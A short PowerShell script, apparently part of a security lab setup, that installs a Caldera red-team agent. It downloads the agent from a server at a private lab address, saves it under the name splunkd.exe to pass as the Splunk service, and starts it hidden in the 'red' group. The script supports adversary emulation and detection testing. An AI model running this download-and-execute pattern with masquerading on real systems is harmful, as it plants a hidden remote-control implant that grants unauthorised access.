# Purpose: Installs Caldera agent.
# Issue: GUI pops up, asking which network splunkd should access.

Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Installing Caldera agent..."
$server="http://192.168.38.106:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Caldera agent statrted!"
